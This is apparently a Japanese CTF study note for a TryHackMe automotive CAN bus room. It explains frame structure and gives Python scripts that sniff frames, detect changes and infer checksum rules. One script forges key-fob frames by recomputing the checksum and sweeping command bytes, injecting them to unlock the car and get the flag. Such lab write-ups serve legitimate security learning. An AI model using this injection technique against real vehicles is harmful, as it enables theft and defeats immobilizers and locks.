# CAN バス

関連　https://tryhackme.com/room/phantomfob

自動車の内部ネットワーク通信。

接続時の挙動

```sh
nc $TARGET 29536
< hi >
```

本来は正しい名前（vcan0, can0, vcan1 ...）を指定しなければならないが、CTFだとなんでも受け入れられたりする場合もある。

```sh
< open vcan0 >
< ok >
< rawmode >
```

## フレームの構造

（VSCODEで見ることを想定）

$$\text{< frame } \underbrace{\text{3B1}}_{\text{(1) CAN ID}} \quad \underbrace{\text{1789349417.030657}}_{\text{(2) タイムスタンプ}} \quad \underbrace{\text{a7ff04834f7ea44e}}_{\text{(3) データ Payload}} \text{ >}$$

### 1. CAN ID (3B1)

16進数表記のメッセージID（標準IDなら11ビット: 0x000 〜 0x7FF）。  
どのECU（制御ユニット）やセンサが発信したデータかを示す識別子です。

### 2. タイムスタンプ (1789349417.030657)

UNIX時間（秒.マイクロ秒）。  
周期性やデータ間隔を追跡するときに使います。（例: 0.01 秒 ≒ 10ms 周期など）

### 3. データ Payload (a7ff04834f7ea44e)

16進数の文字列。2桁ごとに1バイトを表します。  
a7 ff 04 83 4f 7e a4 4e ＝ 8バイト（64ビット）のデータ本体です。

## コード

### 一定時間状態の変わらないIDを探す find_immutable.py

```python
import re
import socket
import sys
import time

# 設定
HOST = "10.145.151.139"
PORT = 29536
CAN_IF = "can0"
SAMPLE_SECONDS = 3.0  # サンプリング時間（秒）

FRAME_PATTERN = re.compile(
    r"<\s*frame\s+([0-9A-Fa-f]+)\s+([0-9\.]+)\s+([0-9A-Fa-f]+)\s*>"
)


def find_static_ids():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))

        # ハンドシェイクとオープン
        s.recv(1024)
        s.sendall(f"< open {CAN_IF} >".encode())
        s.recv(1024)
        s.sendall(b"< rawmode >")
        s.recv(1024)

        print(
            f"[+] Capturing CAN frames for {SAMPLE_SECONDS} seconds to find STATIC IDs...\n"
        )

        # 記録用データ構造
        # payloads_seen = { "3B1": {"a7ff...", "a800..."}, "1DF": {"1c2a..."} }
        payloads_seen = {}
        frame_counts = {}

        start_time = time.time()
        buffer = ""

        # 指定時間だけデータを受信して集計
        while time.time() - start_time < SAMPLE_SECONDS:
            s.settimeout(0.5)
            try:
                data = s.recv(4096).decode("utf-8", errors="ignore")
                if not data:
                    break
                buffer += data
            except socket.timeout:
                continue

            while ">" in buffer:
                end_idx = buffer.find(">")
                raw_frame = buffer[: end_idx + 1]
                buffer = buffer[end_idx + 1 :]

                match = FRAME_PATTERN.search(raw_frame)
                if match:
                    can_id = match.group(1).upper()
                    payload = match.group(3).lower()

                    if can_id not in payloads_seen:
                        payloads_seen[can_id] = set()
                        frame_counts[can_id] = 0

                    payloads_seen[can_id].add(payload)
                    frame_counts[can_id] += 1

        print("=" * 60)
        print(f" STATIC CAN IDs (No payload changes in {SAMPLE_SECONDS}s)")
        print("=" * 60)
        print(f"{'CAN ID':<8} | {'Count':<6} | {'Constant Payload'}")
        print("-" * 60)

        static_count = 0
        for can_id, payloads in sorted(payloads_seen.items()):
            # パターン数が 1 (＝一度も変化していない) のIDのみ出力
            if len(payloads) == 1:
                const_payload = next(iter(payloads))
                count = frame_counts[can_id]
                print(f"0x{can_id:<6} | {count:<6} | {const_payload}")
                static_count += 1

        if static_count == 0:
            print("[!] No static IDs found. All captured IDs had changing payloads.")
        else:
            print("-" * 60)
            print(f"[+] Total Static IDs: {static_count}")

    except KeyboardInterrupt:
        print("\n[*] Stopped.")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        s.close()


if __name__ == "__main__":
    find_static_ids()
```

### 特定IDのフレームが変化した場合のみ表示 catch_changed.py

```python
import re
import socket
import sys

# 設定
HOST = "10.145.151.139"
PORT = 29536
CAN_IF = "can0"

# 監視対象の CAN ID（大文字で指定）
TARGET_IDS = {"407"}

FRAME_PATTERN = re.compile(
    r"<\s*frame\s+([0-9A-Fa-f]+)\s+([0-9\.]+)\s+([0-9A-Fa-f]+)\s*>"
)


def monitor_target_changes():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))
        print(f"[+] Connected to {HOST}:{PORT}")

        # ハンドシェイクと初期化
        s.recv(1024)
        s.sendall(f"< open {CAN_IF} >".encode())
        s.recv(1024)
        s.sendall(b"< rawmode >")
        s.recv(1024)

        print(
            f"[+] Monitoring ONLY target IDs: {', '.join(sorted(TARGET_IDS))}"
        )
        print("[+] Waiting for payload changes...\n")
        print(
            f"{'CAN ID':<8} | {'Previous Payload':<18} -> {'New Payload':<18} | {'Timestamp'}"
        )
        print("-" * 70)

        # 各対象IDの初期値/直前値を保持する辞書
        last_payloads = {}
        buffer = ""

        while True:
            data = s.recv(4096).decode("utf-8", errors="ignore")
            if not data:
                break

            buffer += data

            while ">" in buffer:
                end_idx = buffer.find(">")
                raw_frame = buffer[: end_idx + 1]
                buffer = buffer[end_idx + 1 :]

                match = FRAME_PATTERN.search(raw_frame)
                if match:
                    can_id = match.group(1).upper()
                    timestamp = match.group(2)
                    payload = match.group(3).lower()

                    # ★ 監視対象の ID（279, 2C2）以外は無視
                    if can_id in TARGET_IDS:
                        # ペイロードを2桁(1バイト)ずつスペース区切りに整形
                        fmt_payload = " ".join([payload[i:i+2] for i in range(0, len(payload), 2)])

                        if can_id in last_payloads:
                            prev_payload = last_payloads[can_id]

                            # ペイロードが変化した場合のみ出力
                            if payload != prev_payload:
                                fmt_prev = " ".join([prev_payload[i:i+2] for i in range(0, len(prev_payload), 2)])
                                print(
                                    f"0x{can_id:<6} | {fmt_prev:<23} -> \033[31m{fmt_payload:<23}\033[0m | {timestamp}"
                                )
                                last_payloads[can_id] = payload
                        else:
                            # 初回キャプチャ（現在のベースライン値を記録して表示）
                            print(
                                f"0x{can_id:<6} | {'[BASELINE]':<23} -> {fmt_payload:<23} | {timestamp}"
                            )
                            last_payloads[can_id] = payload

    except KeyboardInterrupt:
        print("\n[*] Stopped monitoring.")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        s.close()


if __name__ == "__main__":
    monitor_target_changes()
```

### 一定時間フレームの種類を監視、それ以降に初めて出てきたフレームのみ表示 catch_firsttime.py

```python
import re
import socket
import sys
import time

# 設定
HOST = "10.145.151.139"
PORT = 29536
CAN_IF = "can0"
LEARN_SECONDS = 3.0  # 初期学習時間（秒）

FRAME_PATTERN = re.compile(
    r"<\s*frame\s+([0-9A-Fa-f]+)\s+([0-9\.]+)\s+([0-9A-Fa-f]+)\s*>"
)


def detect_new_ids():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))

        # ハンドシェイクと初期化
        s.recv(1024)
        s.sendall(f"< open {CAN_IF} >".encode())
        s.recv(1024)
        s.sendall(b"< rawmode >")
        s.recv(1024)

        print(
            f"[+] Phase 1: Learning existing CAN IDs for {LEARN_SECONDS} seconds..."
        )

        known_ids = set()
        start_time = time.time()
        buffer = ""

        # ---- フェーズ1: 既存IDの学習（収集） ----
        while time.time() - start_time < LEARN_SECONDS:
            s.settimeout(0.5)
            try:
                data = s.recv(4096).decode("utf-8", errors="ignore")
                if not data:
                    break
                buffer += data
            except socket.timeout:
                continue

            while ">" in buffer:
                end_idx = buffer.find(">")
                raw_frame = buffer[: end_idx + 1]
                buffer = buffer[end_idx + 1 :]

                match = FRAME_PATTERN.search(raw_frame)
                if match:
                    can_id = match.group(1).upper()
                    known_ids.add(can_id)

        print(
            f"[+] Learning complete. Discovered {len(known_ids)} base IDs: {', '.join(sorted(known_ids))}"
        )
        print("=" * 75)
        print(
            "[+] Phase 2: Monitoring for NEW (Unseen) CAN IDs... Press Ctrl+C to stop."
        )
        print(f"{'NEW CAN ID':<10} | {'Payload':<23} | {'Timestamp'}")
        print("-" * 75)

        # タイムアウト解除
        s.settimeout(None)

        # ---- フェーズ2: 新規IDのリアルタイム監視 ----
        while True:
            data = s.recv(4096).decode("utf-8", errors="ignore")
            if not data:
                break
            buffer += data

            while ">" in buffer:
                end_idx = buffer.find(">")
                raw_frame = buffer[: end_idx + 1]
                buffer = buffer[end_idx + 1 :]

                match = FRAME_PATTERN.search(raw_frame)
                if match:
                    can_id = match.group(1).upper()
                    timestamp = match.group(2)
                    payload = match.group(3).lower()

                    # ★ 未知の ID を検出した場合
                    if can_id not in known_ids:
                        # ペイロードを2桁(1バイト)ずつスペース区切りに整形
                        fmt_payload = " ".join(
                            [payload[i : i + 2] for i in range(0, len(payload), 2)]
                        )
                        print(
                            f"\033[32m0x{can_id:<8}\033[0m | {fmt_payload:<23} | {timestamp}"
                        )
                        # 一度表示したIDは登録して連続ログ出力を防ぐ
                        known_ids.add(can_id)

    except KeyboardInterrupt:
        print("\n[*] Monitoring stopped.")
    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        s.close()


if __name__ == "__main__":
    detect_new_ids()
```

### チェックサムの規則性を利用してコマンドを送る例

```python
#!/usr/bin/env python3
import json
import re
import socket
import threading
import time
import urllib.request

HOST, CAN_PORT, HTTP = "10.145.160.48", 29536, 8080
FRAME_RE = re.compile(
    r"< frame ([0-9A-Fa-f]+) ([0-9]+\.[0-9]+) ([0-9A-Fa-f]*) >"
)
frames, sse = [], []


def bus_conn():
  s = socket.create_connection((HOST, CAN_PORT), timeout=10)
  s.settimeout(0.05)
  s.sendall(b"< open vcan0 >\n")
  time.sleep(0.8)
  s.sendall(b"< rawmode >\n")
  time.sleep(0.4)
  return s


def watch(s):
  buf = b""
  while True:
    try:
      d = s.recv(65536)
    except socket.timeout:
      continue
    if not d:
      return
    buf += d
    while b">" in buf:
      unit, buf = buf.split(b">", 1)
      m = FRAME_RE.search((unit + b">").decode("latin1"))
      if m:
        frames.append((time.time(), m.group(1).upper(), m.group(3).upper()))


def sse_reader():
  r = urllib.request.urlopen("http://%s:%d/events" % (HOST, HTTP), timeout=600)
  buf = b""
  while True:
    d = r.read(1)
    if not d:
      return
    buf += d
    if d == b"\n":
      line = buf.decode(errors="replace").strip()
      buf = b""
      if line.startswith("data: "):
        j = json.loads(line[6:])
        sse.append((j.get("locked"), j.get("immob"), j.get("flag")))


def send_bus(s, cand_id, data_hex):
  b = [data_hex[i : i + 2].lower() for i in range(0, len(data_hex), 2)]
  s.sendall(("< send %s %d %s >\n" % (cand_id, len(b), " ".join(b))).encode())


def press(btn):
  req = urllib.request.Request(
      "http://%s:%d/press" % (HOST, HTTP),
      data=json.dumps({"button": btn}).encode(),
      headers={"Content-Type": "application/json"},
      method="POST",
  )
  urllib.request.urlopen(req, timeout=5).read()


def grab_fob(btn="LOCK"):
  """Press a button and return the resulting 0x2D5 frame."""
  n0 = len(frames)
  t0 = time.time()
  press(btn)
  while time.time() - t0 < 2.0:
    c = [d for t, i, d in frames[n0:] if i == "2D5"]
    if c:
      return c[-1]
  return None


def main():
  obs, inj = bus_conn(), bus_conn()
  threading.Thread(target=watch, args=(obs,), daemon=True).start()
  threading.Thread(target=sse_reader, daemon=True).start()
  time.sleep(3)

  press("IMMOB_ARM")
  time.sleep(1.0)
  press("LOCK")
  time.sleep(1.2)

  for _ in range(3):
    fd = grab_fob("LOCK")
    if not fd:
      continue

    b0 = int(fd[0:2], 16)  # チェックサム
    b1 = int(fd[2:4], 16)  # 93
    b2 = int(fd[4:6], 16)  # 39
    cmd = int(fd[6:8], 16)  # コマンド
    ctr = int(fd[8:10], 16)  # カウンター
    b5 = int(fd[10:12], 16)  # de
    b6 = int(fd[12:14], 16)  # ブロックキー1
    b7 = int(fd[14:16], 16)  # ブロックキー2

    # 同じブロック(b6, b7)内で全コマンドバイト (0x00〜0xFF) をスイープ
    for i in range(256):
      c = (ctr + 1 + i) & 0xFF
      # b0 = (b3 + b4 + b6 + b7 + 0x25) mod 256
      b0n = (i + c + b6 + b7 + 0x25) & 0xFF

      # レイアウト: [b0n] [93] [39] [i] [c] [de] [b6] [b7]
      send_bus(
          inj,
          "2D5",
          "%02X%02X%02X%02X%02X%02X%02X%02X" % (b0n, b1, b2, i, c, b5, b6, b7),
      )

    time.sleep(1.2)
    if sse:
      locked, immob, flag = sse[-1]
      if flag:
        print("[+] FLAG:", flag)
        return

    press("LOCK")
    time.sleep(0.8)

if __name__ == "__main__":
  main()
```

### バイト間の規則性を見つけるスクリプト find_rule.py

b0 以外をターゲットにしたい場合、target_idx を設定する。

```python
#!/usr/bin/env python3
import itertools

# --- 入力データ (16進数文字列のリスト) ---
raw_logs = """
91 08 27 20 eb b0 a0 6f
91 74 a3 20 eb b1 59 6f
91 87 b5 20 eb b2 bf 6f
91 86 b5 20 eb b3 bf 6f
91 81 b5 20 eb b4 bf 6f
91 0c 24 20 eb b5 a2 6f
"""


def parse_data(text):
  data = []
  for line in text.strip().splitlines():
    line = line.strip()
    if not line or line.startswith("#"):
      continue
    bytes_val = [int(x, 16) for x in line.split()]
    if bytes_val:
      data.append(bytes_val)
  return data


def analyze_constant_bytes(dataset):
  """変化しない固定バイト（定数）を特定"""
  num_bytes = len(dataset[0])
  constants = {}
  for i in range(num_bytes):
    vals = set(row[i] for row in dataset)
    if len(vals) == 1:
      constants[i] = list(vals)[0]
  return constants


def solve_addition_model(dataset, target_idx=0):
  """Mod 256 加算関係式の自動探索"""
  num_bytes = len(dataset[0])
  other_indices = [i for i in range(num_bytes) if i != target_idx]

  print("[*] 8ビット算術加算 (Mod 256) モデルの探索中...")

  # 組み合わせるバイトのサブセットを探索 (1個〜全バイト)
  for r in range(1, len(other_indices) + 1):
    for combo in itertools.combinations(other_indices, r):
      # 係数 (1 または -1) の組み合わせ
      for coeffs in itertools.product([1, -1], repeat=r):
        # 最初のデータ行で offset を仮定してみる
        first_row = dataset[0]
        sum_val = sum(c * first_row[i] for c, i in zip(coeffs, combo))
        target_val = first_row[target_idx]
        offset = (target_val - sum_val) % 256

        # 全データ行で成立するか検証
        match = True
        for row in dataset[1:]:
          s = sum(c * row[i] for c, i in zip(coeffs, combo))
          if (s + offset) % 256 != row[target_idx]:
            match = False
            break

        if match:
          # 数式文字列の組み立て
          terms = []
          for c, i in zip(coeffs, combo):
            sign = " + " if c == 1 else " - "
            terms.append(f"{sign}b{i}")
          formula_str = "".join(terms)
          if formula_str.startswith(" + "):
            formula_str = formula_str[3:]

          print(f"\n[+] 【発見】算術加算式が成立しました！")
          print(
              f"    b{target_idx} = ({formula_str} + 0x{offset:02X}) mod 256"
          )
          return True
  return False


def solve_xor_model(dataset, target_idx=0):
  """Bitwise XOR 関係式の自動探索"""
  num_bytes = len(dataset[0])
  other_indices = [i for i in range(num_bytes) if i != target_idx]

  print("[*] ビット XOR モデルの探索中...")

  for r in range(1, len(other_indices) + 1):
    for combo in itertools.combinations(other_indices, r):
      first_row = dataset[0]
      xor_val = 0
      for i in combo:
        xor_val ^= first_row[i]
      offset = first_row[target_idx] ^ xor_val

      match = True
      for row in dataset[1:]:
        x = 0
        for i in combo:
          x ^= row[i]
        if (x ^ offset) != row[target_idx]:
          match = False
          break

      if match:
        terms = [f"b{i}" for i in combo]
        formula_str = " ^ ".join(terms)
        print(f"\n[+] 【発見】XOR演算式が成立しました！")
        print(f"    b{target_idx} = {formula_str} ^ 0x{offset:02X}")
        return True
  return False


def main():
  dataset = parse_data(raw_logs)
  if not dataset:
    print("データが見つかりませんでした。")
    return

  print(f"解析パケット数: {len(dataset)} 行")

  # 固定バイトの検出
  constants = analyze_constant_bytes(dataset)
  if constants:
    c_str = ", ".join([f"b{i}=0x{v:02X}" for i, v in constants.items()])
    print(f"固定値バイト: {c_str}")

  # 1. 加算モデルの自動特定 (b0 をターゲットとして探索)
  if solve_addition_model(dataset, target_idx=0):
    return

  # 2. XORモデルの自動特定
  if solve_xor_model(dataset, target_idx=0):
    return

  print(
      "\n[-] 単純な算術加算・XORモデルでは成立する式が見つかりませんでした。"
  )


if __name__ == "__main__":
  main()
```
